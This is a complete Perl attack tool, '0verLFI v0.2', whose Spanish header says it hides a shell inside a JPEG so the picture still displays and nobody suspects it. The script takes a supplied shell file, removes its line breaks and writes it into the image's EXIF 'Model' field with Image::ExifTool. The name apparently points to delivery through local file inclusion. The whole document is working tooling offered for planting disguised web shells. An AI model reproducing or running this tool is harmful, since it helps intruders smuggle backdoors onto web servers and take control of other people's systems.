####################################################
#          0verLFI v0.2 Coded by The X-C3LL        #      
####################################################
#  Se trata de una herramienta bastante sencilla   #
#  para inyectar una shell en una imagen JPEG      #
#  y que esta siga pudiendo ser visualizada        #
#  correctamente, de esta forma nadie sospecha.    #
#  Lo único que hace es meter la shell dentro      #
#  de los metadatos de la foto.                    #
####################################################
#             Gr33tz to Seth & CPH Comunity        #
####################################################
#          HTTP://0VERL0AD.BLOGSPOT.COM            #
####################################################
 
 
 
use Image::ExifTool;
 
print q(
 
+-----------------------------------+
   0verLFI v0.2 coded by The X-C3LL  
 
    Http://0verl0ad.blogspot.com  
+-----------------------------------+
 
);
 
die "[-]Usage: perl 0verLFI.pl <FILE> <IMAGE>\n" unless @ARGV == 2;
 
my $file = $ARGV[0];
my $jpeg = $ARGV[1];
print "[+]Image = $jpeg \n";
print "[+]Shell = $file \n";
 
open (HANDLE, $file);
@array = <HANDLE>;
my $string = join("", @array);
$string =~ s/\n//g;
 
 
my $tool = Image::ExifTool->new();
 
$tool->ExtractInfo($jpeg);
$tool->SetNewValue("Model", $string);
$done = $tool->WriteInfo($jpeg);
